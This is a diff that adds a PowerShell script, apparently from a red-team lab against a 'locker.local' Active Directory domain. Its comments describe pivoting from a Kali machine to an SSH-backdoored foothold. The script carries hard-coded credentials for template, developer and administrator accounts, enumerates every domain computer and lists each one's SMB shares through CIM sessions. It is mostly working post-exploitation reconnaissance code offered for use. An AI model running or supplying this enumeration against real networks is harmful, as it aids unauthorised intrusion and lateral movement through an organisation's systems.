@@ -1,0 +1,73 @@
+#Move to attacker machine
+#ssh user@host (kali vm)
+# move to foothold where we have backdooored with ssh
+#ssh template@192.168.4.7
+#template:Password123
+#run PSH
+powershell
+#get domain
+$DNC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+$DNC
+
+#Low priv Enumeration
+$User = "locker.local\template"
+$PWord = ConvertTo-SecureString -String "Password123" -AsPlainText -Force
+$Creds = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User, $PWord
+
+$computers = ([adsisearcher]'(objectCategory=computer)').FindAll()
+$compobjects = $computers | select -ExpandProperty Properties
+$list = $compobjects.dnshostname
+foreach($computer in $list){
+$computer
+
+New-CIMSESSION -ComputerName $computer -Credential $creds
+$session = get-cimsession
+write-host "Geting Shares Info for: $computer" -foregroundcolor Gray
+get-smbshare -CimSession $(Get-CIMSESSION -ID $session.id)
+Get-CimSession | Remove-CimSession
+
+}
+
+
+#Medium Priv Enumeration
+$User = "locker.local\developer"
+$PWord = ConvertTo-SecureString -String "Password123" -AsPlainText -Force
+$Creds = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User, $PWord
+
+$computers = ([adsisearcher]'(objectCategory=computer)').FindAll()
+$compobjects = $computers | select -ExpandProperty Properties
+$list = $compobjects.dnshostname
+foreach($computer in $list){
+$computer
+
+New-CIMSESSION -ComputerName $computer -Credential $creds
+$session = get-cimsession
+write-host "Geting Shares Info for: $computer" -foregroundcolor Gray
+get-smbshare -CimSession $(Get-CIMSESSION -ID $session.id)
+Get-CimSession | Remove-CimSession
+
+}
+
+
+#High Priv Enumeration
+$User = "locker.local\administrator"
+$PWord = ConvertTo-SecureString -String "Password123" -AsPlainText -Force
+$Creds = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User, $PWord
+
+$computers = ([adsisearcher]'(objectCategory=computer)').FindAll()
+$compobjects = $computers | select -ExpandProperty Properties
+$list = $compobjects.dnshostname
+foreach($computer in $list){
+$computer
+
+New-CIMSESSION -ComputerName $computer -Credential $creds
+$session = get-cimsession
+write-host "Geting Shares Info for: $computer" -foregroundcolor Gray
+get-smbshare -CimSession $(Get-CIMSESSION -ID $session.id)
+Get-CimSession | Remove-CimSession
+
+}
+
+
+
+
